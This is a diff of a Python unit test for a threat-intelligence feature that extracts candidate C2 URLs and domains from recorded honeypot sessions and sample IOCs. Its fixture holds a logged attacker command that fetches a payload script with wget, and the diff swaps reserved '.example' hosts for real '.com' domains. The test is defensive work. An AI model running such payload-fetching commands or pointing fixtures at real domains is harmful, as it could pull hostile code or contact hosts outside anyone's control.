@@ -51,17 +51,17 @@ class C2Intelligence(unittest.TestCase):
         obj.db.execute("CREATE TABLE samples (sha256 TEXT, first_seen REAL, last_seen REAL, analysis TEXT)")
         now = time.time()
         obj.db.execute("INSERT INTO sessions VALUES (?,?,?,?)",
-                       ("s-1", "198.51.100.9", now, json.dumps(["wget http://malicious.example/payload.sh"])))
+                       ("s-1", "198.51.100.9", now, json.dumps(["wget http://malicious.com/payload.sh"])))
         obj.db.execute("INSERT INTO samples VALUES (?,?,?,?)",
                        ("a" * 64, now, now, json.dumps({"iocs": {"ips": [{"value": "8.8.8.8"}],
-                                                                    "domains": [{"value": "c2.bad-domain.example"}],
+                                                                    "domains": [{"value": "c2.bad-domain.com"}],
                                                                     "urls": []}})))
         obj.db.commit()
         result = obj.c2_intelligence(24)
         values = {(x["kind"], x["value"]) for x in result["candidates"]}
-        self.assertIn(("url", "http://malicious.example/payload.sh"), values)
-        self.assertIn(("domain", "malicious.example"), values)
-        self.assertIn(("domain", "c2.bad-domain.example"), values)
+        self.assertIn(("url", "http://malicious.com/payload.sh"), values)
+        self.assertIn(("domain", "malicious.com"), values)
+        self.assertIn(("domain", "c2.bad-domain.com"), values)
         self.assertNotIn(("ip", "8.8.8.8"), values)
         self.assertEqual(result["confirmed_connections"], [])
         self.assertEqual(result["confirmed_count"], 0)
